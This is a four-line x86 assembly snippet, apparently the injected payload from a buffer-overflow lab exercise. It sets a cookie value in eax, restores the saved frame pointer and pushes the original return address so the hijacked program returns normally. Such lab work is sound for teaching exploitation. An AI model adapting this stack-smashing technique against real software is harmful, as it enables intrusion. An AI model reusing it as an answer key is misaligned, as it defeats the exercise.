mov $0x5a1e4503, %eax   #move cookie to eax
movl $0x55683e80, %ebp   #return orig ebp value
pushl $0x08048c69        #return to orig return address
ret
